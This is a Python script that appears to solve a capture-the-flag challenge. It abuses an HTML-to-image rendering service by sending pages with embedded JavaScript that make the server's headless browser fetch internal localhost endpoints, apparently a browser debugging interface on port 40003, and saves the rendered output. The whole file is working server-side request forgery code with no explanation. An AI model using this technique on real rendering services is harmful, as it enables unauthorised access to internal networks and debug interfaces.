import requests, io, zipfile, time

BASE = 'http://fad4fa65501e0c52f811e82ff7b1afca.playat.flagyard.com'

def render(html, name):
    s = requests.Session()
    s.headers.update({'User-Agent': 'Mozilla/5.0'})
    for _ in range(3):
        try:
            r = s.post(BASE + '/html-to-image', json={'pages': [html]}, timeout=45)
            if r.status_code == 200 and 'zip' in r.headers.get('Content-Type',''):
                z = zipfile.ZipFile(io.BytesIO(r.content))
                for n in z.namelist():
                    with open(f'f:/mission-git-hackss/mission-git-hackss/wd_{name}.jpg','wb') as f: f.write(z.read(n))
                    print(f'{name}: {len(z.read(n))} bytes')
                return
            print(f'{name}: [{r.status_code}] {r.text[:150]}')
            return
        except Exception: time.sleep(2)

def xhrget(url):
    return f'''<!doctype html><html><head><style>body{{font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;padding:10px}}</style></head><body><div id=o>...</div><script>
var x=new XMLHttpRequest();try{{x.open("GET","{url}",false);x.send();document.getElementById("o").textContent=x.status+"|"+x.responseText;}}catch(e){{document.getElementById("o").textContent="ERR:"+e;}}</script></body></html>'''

render(xhrget('http://localhost:40003/status'), 'status')
time.sleep(1)
render(xhrget('http://localhost:40003/json/version'), 'jsonver')
time.sleep(1)
render(xhrget('http://localhost:40003/json/list'), 'jsonlist')
